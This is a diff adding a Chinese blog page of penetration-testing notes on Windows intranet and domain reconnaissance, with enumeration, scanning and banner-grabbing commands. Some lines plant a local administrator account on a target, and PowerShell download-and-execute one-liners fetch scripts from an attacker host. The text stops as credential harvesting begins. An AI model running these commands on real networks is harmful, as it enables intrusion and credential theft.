@@ -1,0 +1,887 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 本机基础信息收集1、查看当前用户、权限1whoami &#x2F;all  2、查看网络1ipconfig &#x2F;all  3、查看主机路由1route print">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网信息收集笔记">
+<meta property="og:url" content="https://sh1yan.top/2023/01/16/Intranet-information-collection-notes/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 本机基础信息收集1、查看当前用户、权限1whoami &#x2F;all  2、查看网络1ipconfig &#x2F;all  3、查看主机路由1route print">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-01-16T15:50:55.000Z">
+<meta property="article:modified_time" content="2023-01-19T10:15:54.000Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="Note">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>内网信息收集笔记 - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网信息收集笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-01-16 23:50" pubdate>
+          2023年1月16日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          68 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内网信息收集笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-本机基础信息收集"><a href="#0x00-本机基础信息收集" class="headerlink" title="0x00 本机基础信息收集"></a>0x00 本机基础信息收集</h4><h5 id="1、查看当前用户、权限"><a href="#1、查看当前用户、权限" class="headerlink" title="1、查看当前用户、权限"></a>1、查看当前用户、权限</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure>
+
+<h5 id="2、查看网络"><a href="#2、查看网络" class="headerlink" title="2、查看网络"></a>2、查看网络</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="3、查看主机路由"><a href="#3、查看主机路由" class="headerlink" title="3、查看主机路由"></a>3、查看主机路由</h5><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">route print<br></code></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h5 id="4、查看操作系统信息"><a href="#4、查看操作系统信息" class="headerlink" title="4、查看操作系统信息"></a>4、查看操作系统信息</h5><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">systeminfo<br>systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS name&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Version&quot;</span>   <span class="hljs-comment">#查看操作系统及版本</span><br>systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 名称&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 版本&quot;</span>        <span class="hljs-comment">#查看操作系统及版本</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="5、查看端口连接信息"><a href="#5、查看端口连接信息" class="headerlink" title="5、查看端口连接信息"></a>5、查看端口连接信息</h5><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="6、查看当前会话列表"><a href="#6、查看当前会话列表" class="headerlink" title="6、查看当前会话列表"></a>6、查看当前会话列表</h5><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> session<br></code></pre></td></tr></table></figure>
+
+<h5 id="7、查看当前网络共享信息"><a href="#7、查看当前网络共享信息" class="headerlink" title="7、查看当前网络共享信息"></a>7、查看当前网络共享信息</h5><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> share<br></code></pre></td></tr></table></figure>
+
+<h5 id="8、查看已连接的网络共享"><a href="#8、查看已连接的网络共享" class="headerlink" title="8、查看已连接的网络共享"></a>8、查看已连接的网络共享</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="9、查看进程"><a href="#9、查看进程" class="headerlink" title="9、查看进程"></a>9、查看进程</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">tasklist<br>tasklist /SVC<br><br>查询主机进程信息,并过滤出进程的路径, 名称和PID<br>wmic process <span class="hljs-built_in">get</span> Name,ProcessId,ExecutablePath<br><br>查看指定进程的路径信息<br>wmic process wheree <span class="hljs-attribute">Name</span>=<span class="hljs-string">&quot;mstdtc.exe&quot;</span> <span class="hljs-built_in">get</span> ExecutablePath<br></code></pre></td></tr></table></figure>
+
+<h5 id="10、查看当前服务信息"><a href="#10、查看当前服务信息" class="headerlink" title="10、查看当前服务信息"></a>10、查看当前服务信息</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic<span class="hljs-built_in"> service </span><span class="hljs-built_in">get</span> Caption,Name,PathName,StartName,State<br><br>查看指定服务的信息，并过滤出服务名称、路径和运行状态<br>wmic<span class="hljs-built_in"> service </span>where <span class="hljs-attribute">Name</span>=<span class="hljs-string">&quot;backdoor&quot;</span> <span class="hljs-built_in">get</span> Caption, PathName, State<br></code></pre></td></tr></table></figure>
+
+<h5 id="11、查看计划任务"><a href="#11、查看计划任务" class="headerlink" title="11、查看计划任务"></a>11、查看计划任务</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /v /fo list<br></code></pre></td></tr></table></figure>
+
+<h5 id="12、查看自启程序"><a href="#12、查看自启程序" class="headerlink" title="12、查看自启程序"></a>12、查看自启程序</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic startup <span class="hljs-keyword">get</span> Caption,Command,<span class="hljs-keyword">Location</span>,<span class="hljs-keyword">User</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="13、查看系统补丁安装信息"><a href="#13、查看系统补丁安装信息" class="headerlink" title="13、查看系统补丁安装信息"></a>13、查看系统补丁安装信息</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic qfe <span class="hljs-built_in">get</span> Caption,CSName,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure>
+
+<h5 id="14、应用安装信息"><a href="#14、应用安装信息" class="headerlink" title="14、应用安装信息"></a>14、应用安装信息</h5><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">wmic <span class="hljs-built_in">product</span> <span class="hljs-built_in">get</span> Caption,Version<br></code></pre></td></tr></table></figure>
+
+<h5 id="15、查看本地用户-组信息"><a href="#15、查看本地用户-组信息" class="headerlink" title="15、查看本地用户&#x2F;组信息"></a>15、查看本地用户&#x2F;组信息</h5><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span><br><span class="hljs-title">net</span> <span class="hljs-keyword">user</span> <span class="hljs-title">name</span><br><br>查看本地管理员组<br>net localgroup administrators<br><br>在目标主机本地创建一个新的用户并加入本地管理组中<br>net <span class="hljs-keyword">user</span> <span class="hljs-title">&lt;username</span>&gt; <span class="hljs-tag">&lt;password&gt;</span> /add                    <span class="hljs-comment">#创建本地用户</span><br>net localgroup administrator <span class="hljs-tag">&lt;username&gt;</span> /add           <span class="hljs-comment">#将用户加入到本地管理员组</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="16、查看当前登录的用户"><a href="#16、查看当前登录的用户" class="headerlink" title="16、查看当前登录的用户"></a>16、查看当前登录的用户</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">query <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="0x01-域内基础信息收集"><a href="#0x01-域内基础信息收集" class="headerlink" title="0x01 域内基础信息收集"></a>0x01 域内基础信息收集</h4><h5 id="1、判断是否存在域环境"><a href="#1、判断是否存在域环境" class="headerlink" title="1、判断是否存在域环境"></a>1、判断是否存在域环境</h5><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">net config workstation<br></code></pre></td></tr></table></figure>
+
+<h5 id="2、域用户信息"><a href="#2、域用户信息" class="headerlink" title="2、域用户信息"></a>2、域用户信息</h5><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span><br><br>查看指定域用户的详细信息可以执行以下命令<br>net <span class="hljs-keyword">user</span> <span class="hljs-title">&lt;username</span>&gt; /domain<br><br>获取所有用户的SID、所属域和用户描述信息<br>wmic useraccount get Caption,Domain,Description<br></code></pre></td></tr></table></figure>
+
+<h5 id="3、查看域用户组信息"><a href="#3、查看域用户组信息" class="headerlink" title="3、查看域用户组信息"></a>3、查看域用户组信息</h5><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs axapta">net <span class="hljs-keyword">group</span> /domain    <span class="hljs-meta">#列出域内所有用户组</span><br>net <span class="hljs-keyword">group</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain    <span class="hljs-meta">#查询域内管理员组,得到所有域管理员用户</span><br>net <span class="hljs-keyword">group</span> <span class="hljs-string">&quot;Domain Computers&quot;</span> /domain <span class="hljs-meta">#查询域内成员主机组,获得域内所有客户端主机</span><br>net <span class="hljs-keyword">group</span> <span class="hljs-string">&quot;Domain Users&quot;</span> /domain     <span class="hljs-meta">#查询用户组，得到域用户</span><br>net <span class="hljs-keyword">group</span> <span class="hljs-string">&quot;Enterprise Admins&quot;</span> /domain  <span class="hljs-meta">#管理员组</span><br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>域组名称</th>
+<th>说明(记住组名就行,里面的用户见名知意)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Domain Admins</strong></td>
+<td>域管理员组,包括所有域管理员用户</td>
+</tr>
+<tr>
+<td><strong>Domain Computers</strong></td>
+<td>域成员主机组,包括加入域的所有工作站和服务器,用户名格式为<code>机器名</code>+<code>$</code></td>
+</tr>
+<tr>
+<td><strong>Domain Controllers</strong></td>
+<td>域控制器组,包括域中的所有域控制器 (查询这个用户组可以得到所有域控制器主机名,见下面第5点)</td>
+</tr>
+<tr>
+<td><strong>Domain Guests</strong></td>
+<td>域来宾组,包括所有的来宾用户</td>
+</tr>
+<tr>
+<td><strong>Domain Users</strong></td>
+<td>域用户组,包括所有的域用户</td>
+</tr>
+<tr>
+<td><strong>Enterprise Admins</strong></td>
+<td>企业系统管理员组, 适用于域林范围</td>
+</tr>
+</tbody></table>
+<h5 id="4、域内密码策略"><a href="#4、域内密码策略" class="headerlink" title="4、域内密码策略"></a>4、域内密码策略</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net accounts /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="5、查看域控制器列表"><a href="#5、查看域控制器列表" class="headerlink" title="5、查看域控制器列表"></a>5、查看域控制器列表</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br><br>查询域控制器组，获取所有的域控制器的主机名<br>nltest /<span class="hljs-variable constant_">DCLIST</span><span class="hljs-symbol">:hack-my</span>.com<br></code></pre></td></tr></table></figure>
+
+<h5 id="6、查看主域控制器"><a href="#6、查看主域控制器" class="headerlink" title="6、查看主域控制器"></a>6、查看主域控制器</h5><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure>
+
+<h5 id="7、定位域控制器"><a href="#7、定位域控制器" class="headerlink" title="7、定位域控制器"></a>7、定位域控制器</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ping</span> DC-<span class="hljs-number">1</span>.hack-my.com<br></code></pre></td></tr></table></figure>
+
+<h5 id="8、查看域信任关系"><a href="#8、查看域信任关系" class="headerlink" title="8、查看域信任关系"></a>8、查看域信任关系</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nltest /domain_trusts<br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-内网资源探测"><a href="#0x02-内网资源探测" class="headerlink" title="0x02 内网资源探测"></a>0x02 内网资源探测</h4><h5 id="1、发现内网存活主机"><a href="#1、发现内网存活主机" class="headerlink" title="1、发现内网存活主机"></a>1、发现内网存活主机</h5><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs livescript">ICMP探测：<br><br><span class="hljs-keyword">for</span> /L %I <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.</span>%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span><br><br>NetBIOS (网络基本输入/输出系统)协议探测：<br><br>.<span class="hljs-string">\nbtscan.exe</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>/<span class="hljs-number">24</span><br><br>UDP探测:<br><br>unicornscan -mU <span class="hljs-number">10.10</span>.<span class="hljs-number">10.0</span>/<span class="hljs-number">24</span><br><br>.<span class="hljs-string">\arp-scan.exe</span> -t <span class="hljs-number">192.168</span>.<span class="hljs-number">239.0</span>/<span class="hljs-number">24</span>  <span class="hljs-comment">#https://github.com/QbsuranAlang/arp-scan-windows-</span><br><br>Import-Module .<span class="hljs-string">\Invoke-ARPScan.ps1</span>    <span class="hljs-comment">#https://raw.githubusercontent.com/sinmygit/git/master/Invoke-ARPScan.ps1</span><br>Invoke-ARPScan -CIDR <span class="hljs-number">192.168</span>.<span class="hljs-number">92.1</span>/<span class="hljs-number">24</span><br><br>powshell.exe -exec bypass -Command <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://your-ip:port/Invoke-ARPScan.ps1&#x27;);Invoke-ARPScan -CIDR 192.168.92.1/24&quot;</span><br><br>SMB探测:<br><br>CrackMapExec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.0</span>/<span class="hljs-number">24</span><br>.<span class="hljs-string">\crackmapexec.exe</span> --service-type smb <span class="hljs-number">192.168</span>.<span class="hljs-number">239.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="2、内网端口扫描"><a href="#2、内网端口扫描" class="headerlink" title="2、内网端口扫描"></a>2、内网端口扫描</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">telnet</span>：<br><br><span class="hljs-attribute">telnet</span> &lt;ip&gt; &lt;port&gt;<br><br><span class="hljs-attribute">Nmap</span>：<br><br><span class="hljs-attribute">nmap</span> -min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168.1.10</span><br><span class="hljs-attribute">nmap</span> -sT -sV -O -p22,<span class="hljs-number">80</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">8080</span> <span class="hljs-number">192.168.1.10</span><br><span class="hljs-attribute">nmap</span> --script=vuln -p22,<span class="hljs-number">80</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">8080</span> <span class="hljs-number">192.168.1.10</span><br><br><span class="hljs-attribute">powershell</span>：<br><br><span class="hljs-attribute">Invoke</span>-PortScan -StartAddress <span class="hljs-number">192.168.92.1</span> -EndAddress <span class="hljs-number">192.168.92.30</span> -ResolveHost -ScanPort<br><br><span class="hljs-attribute">Invoke</span>-PortScan -StartAddress <span class="hljs-number">192.168.92.1</span> -EndAddress <span class="hljs-number">192.168.92.30</span> -ResolveHost -ScanPort -Port <span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">8080</span><br><br><span class="hljs-attribute">powershell</span>.exe -exec bypass -Command <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.92.1/Invoke-PortScan.ps1&#x27;);Invoke-PortScan -StartAddress 192.168.92.1 -EndAddress 192.168.92.30 -ResolveHost -ScanPort&quot;</span>   <br><br><span class="hljs-attribute">powershell</span>.exe -exec bypass -Command <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.92.1/Invoke-PortScan.ps1&#x27;);Invoke-PortScan -StartAddress 192.168.92.1 -EndAddress 192.168.92.30 -ResolveHost -ScanPort -Port 80,88,135,139,443,445,3306,3389,8080&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<h5 id="3、利用MetaSploite探测内网"><a href="#3、利用MetaSploite探测内网" class="headerlink" title="3、利用MetaSploite探测内网"></a>3、利用MetaSploite探测内网</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br>search auxiliary/scanner<br></code></pre></td></tr></table></figure>
+
+<h5 id="4、端口Banner信息"><a href="#4、端口Banner信息" class="headerlink" title="4、端口Banner信息"></a>4、端口Banner信息</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">nc<span class="hljs-built_in"> ip port</span><br><span class="hljs-built_in"></span><br>telnet<span class="hljs-built_in"> ip port</span><br><span class="hljs-built_in"></span><br>nmap <span class="hljs-attribute">-script</span>=banner -Pn 192.168.1.1<br></code></pre></td></tr></table></figure>
+
+<h4 id="0x03-收集用户凭证"><a href="#0x03-收集用户凭证" class="headerlink" title="0x03 收集用户凭证"></a>0x03 收集用户凭证</h4><h5 id="1、获取域内单击密码和哈希值"><a href="#1、获取域内单击密码和哈希值" class="headerlink" title="1、获取域内单击密码和哈希值"></a>1、获取域内单击密码和哈希值</h5><p>Windows Server 2012及以上版本需要手动开启WDigest功能，并重新登陆或注销后使用</p>
